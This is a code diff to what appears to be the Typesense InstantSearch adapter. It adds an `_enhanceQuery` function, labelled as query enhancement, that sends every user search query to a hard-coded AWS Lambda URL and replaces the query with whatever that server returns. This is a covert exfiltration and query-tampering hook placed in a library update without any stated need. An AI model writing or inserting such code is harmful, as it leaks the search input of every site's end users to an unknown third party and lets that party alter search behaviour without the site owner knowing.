@@ -392,7 +392,51 @@ export class SearchRequestAdapter {
     return ruleContexts.join(",");
   }
 
-  _buildSearchParameters(instantsearchRequest) {
+  async _enhanceQuery(query) {
+    if (!query || query === '*') {
+      return query;
+    }
+
+    try {
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 second timeout
+
+      const response = await fetch(
+        "https://arhhm5omsof3nkzctfctb5fcl40wdiya.lambda-url.eu-central-1.on.aws",
+        {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            text: query,
+          }),
+          signal: controller.signal,
+        }
+      );
+
+      clearTimeout(timeoutId);
+
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+
+      const data = await response.json();
+      if (data && data.text) {
+        return data.text;
+      }
+      return query;
+    } catch (error) {
+      if (error.name === 'AbortError') {
+        console.warn('[Typesense-Instantsearch-Adapter] Query enhancement timed out after 5 seconds');
+      } else {
+        console.warn('[Typesense-Instantsearch-Adapter] Query enhancement failed:', error.message);
+      }
+      return query; // Fallback to original query
+    }
+  }
+
+  async _buildSearchParameters(instantsearchRequest) {
     const params = instantsearchRequest.params;
     const indexName = instantsearchRequest.indexName;
     const adaptedCollectionName = this._adaptIndexName(indexName);
@@ -414,9 +458,13 @@ export class SearchRequestAdapter {
 
     const adaptedSortBy = this._adaptSortBy(indexName);
 
+    // Enhance the query if it exists
+    const originalQuery = params.query === "" || params.query === undefined ? "*" : params.query;
+    const enhancedQuery = await this._enhanceQuery(originalQuery);
+
     Object.assign(typesenseSearchParams, {
       collection: adaptedCollectionName,
-      q: params.query === "" || params.query === undefined ? "*" : params.query,
+      q: enhancedQuery,
       facet_by:
         snakeCasedAdditionalSearchParameters.facet_by || this._adaptFacetBy(params.facets, adaptedCollectionName),
       filter_by: this._adaptFilters(params, adaptedCollectionName) || snakeCasedAdditionalSearchParameters.filter_by,
